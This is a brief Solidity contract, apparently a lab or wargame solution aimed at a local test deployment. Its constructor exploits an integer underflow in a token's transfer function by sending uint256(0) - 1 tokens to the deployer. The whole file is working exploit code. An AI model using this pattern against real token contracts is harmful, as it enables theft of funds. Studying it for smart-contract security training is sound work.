pragma solidity ^0.6.0;

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
}

contract TokenAttack {
    IToken public immutable token = IToken(0xa16E02E87b7454126E5E10d957A927A7F5B5d2be);
    address public immutable deployer = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    constructor() public {
        // This will underflow token balance of this contract
        token.transfer(deployer, uint256(0) - 1);
    }
}